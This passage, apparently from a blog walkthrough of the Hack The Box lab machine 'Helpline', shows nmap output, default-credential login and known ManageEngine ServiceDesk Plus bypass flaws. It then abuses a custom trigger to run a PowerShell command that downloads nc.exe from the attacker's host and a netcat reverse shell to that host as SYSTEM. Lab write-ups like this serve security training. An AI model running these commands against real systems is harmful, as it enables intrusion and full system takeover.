|     &lt;span class=&quot;nt&quot;&gt;&amp;lt;link&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;href=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;/style/loginstyle.css?9309&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;type=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;text/css&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;rel=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;stylesheet&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;/&amp;gt;&lt;/span&gt;
|     &lt;span class=&quot;nt&quot;&gt;&amp;lt;link&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;href=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;/style/new-classes.css?9309&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;type=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;text/css&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;rel=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;stylesheet&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;
|     &lt;span class=&quot;nt&quot;&gt;&amp;lt;link&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;href=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;/style/new-classes-sdp.css?9309&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;type=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;text/css&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;rel=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;stylesheet&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;
|_    &lt;span class=&quot;nt&quot;&gt;&amp;lt;link&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;href=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;/style/conflict-fix.css?9309&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;type=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;text/css&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;rel=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;stylesheet&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;
|_http-open-proxy: Proxy might be redirecting requests
|_http-server-header: -
|_http-title: ManageEngine ServiceDesk Plus
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port8080-TCP:V=7.70%I=7%D=8/15%Time=5D55AAAF%P=x86_64-pc-linux-gnu%r(Ge
SF:tRequest,2328,&quot;HTTP/1\.1\x20200\x20OK\r\nSet-Cookie:\x20JSESSIONID=65E8
SF:A121BA313E88FEEFE9C1E493AC61;\x20Path=/;\x20HttpOnly\r\nCache-Control:\
SF:x20private\r\nExpires:\x20Thu,\x2001\x20Jan\x201970\x2001:00:00\x20GMT\
SF:r\nContent-Type:\x20text/html;charset=UTF-8\r\nVary:\x20Accept-Encoding
SF:\r\nDate:\x20Thu,\x2015\x20Aug\x202019\x2017:55:43\x20GMT\r\nConnection
SF::\x20close\r\nServer:\x20-\r\n\r\n&lt;span class=&quot;nt&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;!&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;DOCTYPE&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;\&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;x20html&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;\n&lt;span class=&quot;nt&quot;&gt;&amp;lt;html&amp;gt;&lt;/span&gt;\n&lt;span class=&quot;nt&quot;&gt;&amp;lt;head&amp;gt;&lt;/span&gt;\n&lt;span class=&quot;nt&quot;&gt;&amp;lt;&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;SF:meta&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;\&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;x20http-equiv=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;\&quot;X-UA-Compatible\&quot;\x20content=\&quot;IE=Edge\&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;\n\n\n\n\
SF:r\n\n\x20\x20\x20\x20&lt;span class=&quot;nt&quot;&gt;&amp;lt;script&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;\&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;x20language=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'JavaScript'&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;\&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;x20type=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;\&quot;text/ja&lt;/span&gt;
&lt;span class=&quot;na&quot;&gt;SF:vascript&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;\&quot;\&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;x20src=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'/scripts/Login\.js\?9309'&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&amp;lt;/script&amp;gt;&lt;/span&gt;\n\x20\x20\x20\x2
SF:0&lt;span class=&quot;nt&quot;&gt;&amp;lt;script&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;\&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;x20language=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'JavaScript'&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;\&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;x20type=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;\&quot;text/javascript\&quot;\x20src='/&lt;/span&gt;
&lt;span class=&quot;na&quot;&gt;SF:scripts&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;jquery-1&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;\.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;8&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;\.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;3&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;\.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;min&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;\.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;js&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;'&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&amp;lt;/script&amp;gt;&lt;/span&gt;\n\x20\x20\x20\x20\n\x20\x20\
SF:x20\x20&lt;span class=&quot;nt&quot;&gt;&amp;lt;link&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;\&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;x20href=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;\&quot;/style/loginstyle\.css\?9309\&quot;\x20type=\&quot;text/cs&lt;/span&gt;
&lt;span class=&quot;na&quot;&gt;SF:s&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;\&quot;\&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;x20rel=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;\&quot;stylesheet\&quot;/&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;\n\x20\x20\x20\x20&lt;span class=&quot;nt&quot;&gt;&amp;lt;link&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;\&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;x20href=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;\&quot;/style/new&lt;/span&gt;
&lt;span class=&quot;na&quot;&gt;SF:-classes&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;\.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;css&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;\?&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;9309&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;\&quot;\&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;x20type=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;\&quot;text/css\&quot;\x20rel=\&quot;stylesheet\&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;\n\x20
SF:\x20\x20\x20&lt;span class=&quot;nt&quot;&gt;&amp;lt;link&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;\&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;x20href=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;\&quot;/style/new-classes-sdp\.css\?9309\&quot;\x20type&lt;/span&gt;
&lt;span class=&quot;na&quot;&gt;SF:=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;\&quot;text/css\&quot;\x20rel=\&quot;stylesheet\&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;\n\x20\x20\x20\x20&lt;span class=&quot;nt&quot;&gt;&amp;lt;link&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;\&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;x20href=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;\&quot;/&lt;/span&gt;
&lt;span class=&quot;na&quot;&gt;SF:style&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;conflict-fix&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;\.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;css&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;\?&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;9309&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;\&quot;\&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;x20type=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;\&quot;text/css\&quot;\x20rel=\&quot;styleshee&lt;/span&gt;
&lt;span class=&quot;na&quot;&gt;SF:t&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;\&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;&quot;)%r(HTTPOptions,2328,&quot;HTTP/1\.1\x20200\x20OK\r\nSet-Cookie:\x20JSE
SF:SSIONID=27315C0AAF7C9B2D64D6C2B7EFD03FD9;\x20Path=/;\x20HttpOnly\r\nCac
SF:he-Control:\x20private\r\nExpires:\x20Thu,\x2001\x20Jan\x201970\x2001:0
SF:0:00\x20GMT\r\nContent-Type:\x20text/html;charset=UTF-8\r\nVary:\x20Acc
SF:ept-Encoding\r\nDate:\x20Thu,\x2015\x20Aug\x202019\x2017:55:45\x20GMT\r
SF:\nConnection:\x20close\r\nServer:\x20-\r\n\r\n&lt;span class=&quot;nt&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;!&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;DOCTYPE&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;\&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;x20html&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;\n&lt;span class=&quot;nt&quot;&gt;&amp;lt;html&lt;/span&gt;
&lt;span class=&quot;na&quot;&gt;SF:&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;\n&lt;span class=&quot;nt&quot;&gt;&amp;lt;head&amp;gt;&lt;/span&gt;\n&lt;span class=&quot;nt&quot;&gt;&amp;lt;meta&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;\&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;x20http-equiv=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;\&quot;X-UA-Compatible\&quot;\x20content=\&quot;IE=Edge&lt;/span&gt;
&lt;span class=&quot;na&quot;&gt;SF:&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;\&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;\n\n\n\n\r\n\n\x20\x20\x20\x20&lt;span class=&quot;nt&quot;&gt;&amp;lt;script&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;\&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;x20language=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'JavaScript'&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;\&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;x20ty&lt;/span&gt;
&lt;span class=&quot;na&quot;&gt;SF:pe=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;\&quot;text/javascript\&quot;\x20src='/scripts/Login\.js\?9309'&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&amp;lt;/script&amp;gt;&lt;/span&gt;\n\x2
SF:0\x20\x20\x20&lt;span class=&quot;nt&quot;&gt;&amp;lt;script&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;\&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;x20language=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'JavaScript'&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;\&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;x20type=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;\&quot;text/javascript&lt;/span&gt;
&lt;span class=&quot;na&quot;&gt;SF:&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;\&quot;\&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;x20src=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'/scripts/jquery-1\.8\.3\.min\.js'&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&amp;lt;/script&amp;gt;&lt;/span&gt;\n\x20\x20\x20\x2
SF:0\n\x20\x20\x20\x20&lt;span class=&quot;nt&quot;&gt;&amp;lt;link&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;\&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;x20href=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;\&quot;/style/loginstyle\.css\?9309\&quot;\x20ty&lt;/span&gt;
&lt;span class=&quot;na&quot;&gt;SF:pe=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;\&quot;text/css\&quot;\x20rel=\&quot;stylesheet\&quot;/&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;\n\x20\x20\x20\x20&lt;span class=&quot;nt&quot;&gt;&amp;lt;link&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;\&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;x20href=&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;
&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;SF:\&quot;/style/new-classes\.css\?9309\&quot;\x20type=\&quot;text/css\&quot;\x20rel=\&quot;stylesh&lt;/span&gt;
&lt;span class=&quot;na&quot;&gt;SF:eet&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;\&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;\n\x20\x20\x20\x20&lt;span class=&quot;nt&quot;&gt;&amp;lt;link&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;\&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;x20href=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;\&quot;/style/new-classes-sdp\.css\?93&lt;/span&gt;
&lt;span class=&quot;na&quot;&gt;SF:09&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;\&quot;\&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;x20type=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;\&quot;text/css\&quot;\x20rel=\&quot;stylesheet\&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;\n\x20\x20\x20\x20&lt;span class=&quot;nt&quot;&gt;&amp;lt;link&lt;/span&gt;
&lt;span class=&quot;na&quot;&gt;SF:&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;\&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;x20href=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;\&quot;/style/conflict-fix\.css\?9309\&quot;\x20type=\&quot;text/css\&quot;\x20rel&lt;/span&gt;
&lt;span class=&quot;na&quot;&gt;SF:=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;\&quot;stylesheet\&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;&quot;);
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: -59m59s, deviation: 0s, median: -59m59s
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2019-08-15 19:57:28
|_  start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Thu Aug 15 20:58:04 2019 -- 1 IP address (1 host up) scanned in 162.71 seconds

&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;h4 id=&quot;we-got-http-on-port-8080-and-smb-i-tried-to-list-smb-shares-but-i-couldnt-authenticate-anonymously-&quot;&gt;We got &lt;code class=&quot;highlighter-rouge&quot;&gt;http&lt;/code&gt; on port 8080 and &lt;code class=&quot;highlighter-rouge&quot;&gt;smb&lt;/code&gt;. I tried to list &lt;code class=&quot;highlighter-rouge&quot;&gt;smb&lt;/code&gt; shares but I couldn’t authenticate anonymously :&lt;/h4&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@kali:~/Desktop/HTB/boxes/helpline# smbclient --list //helpline.htb/ -U &quot;&quot;
Enter WORKGROUP\'s password: 
session setup failed: NT_STATUS_LOGON_FAILURE
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
&lt;hr /&gt;

&lt;h3 id=&quot;http-initial-enumeration-administrative-access&quot;&gt;HTTP Initial Enumeration, Administrative Access&lt;/h3&gt;
&lt;h4 id=&quot;on-the-http-port-there-was-an-application-called-manageengine-servicedesk-plus&quot;&gt;On the &lt;code class=&quot;highlighter-rouge&quot;&gt;http&lt;/code&gt; port there was an application called &lt;code class=&quot;highlighter-rouge&quot;&gt;ManageEngine ServiceDesk Plus&lt;/code&gt;.&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/helpline/1.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;i-tried-some-common-credentials-like-adminadmin-and-guestguest-which-actually-worked-&quot;&gt;I tried some common credentials like &lt;code class=&quot;highlighter-rouge&quot;&gt;admin:admin&lt;/code&gt; and &lt;code class=&quot;highlighter-rouge&quot;&gt;guest:guest&lt;/code&gt; which actually worked :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/helpline/2.png&quot; alt=&quot;&quot; /&gt;
&lt;br /&gt;
&lt;br /&gt;
&lt;img src=&quot;/images/hackthebox/helpline/3.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;but-as-guest-my-capabilities-were-limited-so-i-had-to-elevate-to-an-administrative-user-i-searched-for-known-vulnerabilities-for-this-application-and-found-this-authentication-bypass-vulnerability-however-to-exploit-it-i-needed-a-valid-username-&quot;&gt;But as &lt;code class=&quot;highlighter-rouge&quot;&gt;guest&lt;/code&gt; my capabilities were limited so I had to elevate to an administrative user. I searched for known vulnerabilities for this application and found this &lt;a href=&quot;https://www.exploit-db.com/exploits/42037&quot;&gt;authentication bypass vulnerability&lt;/a&gt;. However to exploit it I needed a valid username :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/helpline/4.png&quot; alt=&quot;&quot; /&gt;
&lt;br /&gt;
&lt;br /&gt;
&lt;img src=&quot;/images/hackthebox/helpline/5.png&quot; alt=&quot;&quot; /&gt;
&lt;br /&gt;
&lt;br /&gt;
&lt;img src=&quot;/images/hackthebox/helpline/6.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;luckily-there-was-another-user-enumeration-vulnerability-which-i-could-exploit-as-guest&quot;&gt;luckily there was another &lt;a href=&quot;https://www.exploit-db.com/exploits/35891&quot;&gt;user enumeration vulnerability&lt;/a&gt; which I could exploit as &lt;code class=&quot;highlighter-rouge&quot;&gt;guest&lt;/code&gt;.&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/helpline/7.png&quot; alt=&quot;&quot; /&gt;
&lt;br /&gt;
&lt;br /&gt;
&lt;img src=&quot;/images/hackthebox/helpline/8.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;before-using-wfuzz-with-a-long-wordlist-i-tried-some-common-usernames-first-administrator-was-an-existing-user-&quot;&gt;Before using &lt;code class=&quot;highlighter-rouge&quot;&gt;wfuzz&lt;/code&gt; with a long wordlist I tried some common usernames first, &lt;code class=&quot;highlighter-rouge&quot;&gt;administrator&lt;/code&gt; was an existing user :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/helpline/9.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;to-exploit-the-authentication-bypass-vulnerability-we-have-to-login-as-guest-then-navigate-to-mc-and-logout-after-that-we-will-login-as-administrator--by-using-administrator-as-username-and-password-then-return-to-the-index-page-again-and-we-will-be-redirected-to-the-dashboard-as-administrator&quot;&gt;To exploit the authentication bypass vulnerability we have to login as &lt;code class=&quot;highlighter-rouge&quot;&gt;guest&lt;/code&gt;, then navigate to &lt;code class=&quot;highlighter-rouge&quot;&gt;/mc&lt;/code&gt; and logout. After that we will login as &lt;code class=&quot;highlighter-rouge&quot;&gt;administrator&lt;/code&gt;  by using &lt;code class=&quot;highlighter-rouge&quot;&gt;administrator&lt;/code&gt; as username and password then return to the index page again and we will be redirected to the dashboard as &lt;code class=&quot;highlighter-rouge&quot;&gt;administrator&lt;/code&gt;.&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/helpline/10.png&quot; alt=&quot;&quot; /&gt;
&lt;br /&gt;
&lt;br /&gt;
&lt;img src=&quot;/images/hackthebox/helpline/11.png&quot; alt=&quot;&quot; /&gt;
&lt;br /&gt;
&lt;br /&gt;
&lt;img src=&quot;/images/hackthebox/helpline/12.png&quot; alt=&quot;&quot; /&gt;
&lt;br /&gt;
&lt;br /&gt;
&lt;img src=&quot;/images/hackthebox/helpline/13.gif&quot; alt=&quot;&quot; /&gt;
&lt;br /&gt;
&lt;br /&gt;
&lt;img src=&quot;/images/hackthebox/helpline/14.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;there-is-also-a-published-exploit-that-does-the-same-thing-automatically-&quot;&gt;There is also a published &lt;a href=&quot;https://www.exploit-db.com/exploits/46659&quot;&gt;exploit&lt;/a&gt; that does the same thing automatically :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/helpline/15.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;hr /&gt;

&lt;h3 id=&quot;rce&quot;&gt;RCE&lt;/h3&gt;
&lt;h4 id=&quot;i-checked-the-admin-section-and-custom-triggers-under-helpdesk-customizer-caught-my-attention&quot;&gt;I checked the &lt;code class=&quot;highlighter-rouge&quot;&gt;Admin&lt;/code&gt; section and &lt;code class=&quot;highlighter-rouge&quot;&gt;Custom Triggers&lt;/code&gt; under &lt;code class=&quot;highlighter-rouge&quot;&gt;Helpdesk Customizer&lt;/code&gt; caught my attention.&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/helpline/16.png&quot; alt=&quot;&quot; /&gt;
&lt;br /&gt;
&lt;br /&gt;
&lt;img src=&quot;/images/hackthebox/helpline/17.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;description-says--you-can-define-rules-to-automatically-invoke-any-custom-class-or-script-file-the-action-rules-can-be-applied-to-a-request-when-it-is-created-or-received-or-edited-or-both&quot;&gt;Description says : “You can define rules to automatically invoke any custom class or script file. The action rules can be applied to a request when it is created, (or received) or edited or both”&lt;/h4&gt;
&lt;h4 id=&quot;i-ran-a-python-http-server-to-host-ncexe-then-i-created-a-trigger-that-executes-&quot;&gt;I ran a python &lt;code class=&quot;highlighter-rouge&quot;&gt;http&lt;/code&gt; server to host &lt;code class=&quot;highlighter-rouge&quot;&gt;nc.exe&lt;/code&gt; then I created a trigger that executes :&lt;/h4&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;powershell -command Invoke-WebRequest http://10.10.xx.xx/nc.exe -OutFile C:\Windows\System32\spool\drivers\color\nc.exe
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;h4 id=&quot;when-a-request-is-created-it-must-has-the-word-test-in-the-subject&quot;&gt;When a request is created (it must has the word &lt;code class=&quot;highlighter-rouge&quot;&gt;test&lt;/code&gt; in the subject).&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/helpline/18.png&quot; alt=&quot;&quot; /&gt;
&lt;br /&gt;
&lt;br /&gt;
&lt;img src=&quot;/images/hackthebox/helpline/19.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;last-thing-to-do-is-to-create-a-request-that-runs-the-trigger-&quot;&gt;Last thing to do is to create a request that runs the trigger :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/helpline/20.png&quot; alt=&quot;&quot; /&gt;
&lt;br /&gt;
&lt;br /&gt;
&lt;img src=&quot;/images/hackthebox/helpline/21.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;i-edited-the-trigger-and-made-it-execute-&quot;&gt;I edited the trigger and made it execute :&lt;/h4&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;C:\Windows\System32\spool\drivers\color\nc.exe -e cmd.exe 10.10.xx.xx 1337
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;h4 id=&quot;then-i-created-another-request-and-got-a-reverse-shell-as-nt-authoritysystem-&quot;&gt;Then I created another request and got a reverse shell as &lt;code class=&quot;highlighter-rouge&quot;&gt;nt authority\system&lt;/code&gt; :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/helpline/22.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;hr /&gt;

&lt;h3 id=&quot;encrypted-flags&quot;&gt;Encrypted Flags&lt;/h3&gt;
&lt;h4 id=&quot;although-i-was-system-i-couldnt-read-the-flags-&quot;&gt;Although I was &lt;code class=&quot;highlighter-rouge&quot;&gt;system&lt;/code&gt; I couldn’t read the flags :&lt;/h4&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;E:\ManageEngine\ServiceDesk\integration\custom_scripts&amp;gt;c:                         
c:              
C:\&amp;gt;cd Users                  
cd Users 
C:\Users&amp;gt;cd Administrator           
cd Administrator
C:\Users\Administrator&amp;gt;cd Desktop                 
cd Desktop
C:\Users\Administrator\Desktop&amp;gt;type root.txt                           
type root.txt
Access is denied.
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;C:\Users&amp;gt;cd tolu
cd tolu

C:\Users\tolu&amp;gt;cd Desktop
cd Desktop

C:\Users\tolu\Desktop&amp;gt;dir
dir
 Volume in drive C has no label.
 Volume Serial Number is D258-5C3B

 Directory of C:\Users\tolu\Desktop

12/29/2018  10:21 PM    &amp;lt;DIR&amp;gt;          .
12/29/2018  10:21 PM    &amp;lt;DIR&amp;gt;          ..
12/21/2018  12:12 AM                32 user.txt
               1 File(s)             32 bytes
               2 Dir(s)   5,851,750,400 bytes free

C:\Users\tolu\Desktop&amp;gt;type user.txt
type user.txt
Access is denied.
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;h4 id=&quot;thats-because-the-flags-are-efs-encrypted-&quot;&gt;That’s because the flags are &lt;code class=&quot;highlighter-rouge&quot;&gt;EFS&lt;/code&gt; encrypted :&lt;/h4&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;C:\Users\Administrator\Desktop&amp;gt;cipher /c root.txt
cipher /c root.txt

 Listing C:\Users\Administrator\Desktop\
 New files added to this directory will not be encrypted.

E root.txt
  Compatibility Level:
    Windows XP/Server 2003

  Users who can decrypt:
    HELPLINE\Administrator [Administrator(Administrator@HELPLINE)]
